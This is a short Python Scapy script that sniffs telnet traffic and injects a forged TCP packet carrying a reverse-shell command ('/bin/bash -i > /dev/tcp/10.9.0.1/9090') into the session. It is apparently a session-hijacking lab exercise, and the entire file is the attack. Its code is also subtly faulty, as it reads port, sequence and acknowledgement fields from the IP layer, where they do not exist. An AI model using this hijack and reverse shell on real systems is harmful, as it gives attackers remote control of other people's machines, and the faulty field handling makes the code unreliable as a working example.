#!/usr/bin/env python3
from scapy.all import *

def callback(pkt):
    ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
    tcp = TCP(sport=pkt[IP].sport, dport=pkt[IP].dport, flags="A", seq=pkt[IP].seq, ack=pkt[IP].ack)
    data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
    pkt = ip/tcp/data
    ls(pkt)
    send(pkt,verbose=0)

pkt = sniff(iface='br-9ee9c232b895', filter="tcp port 23", prn=callback)
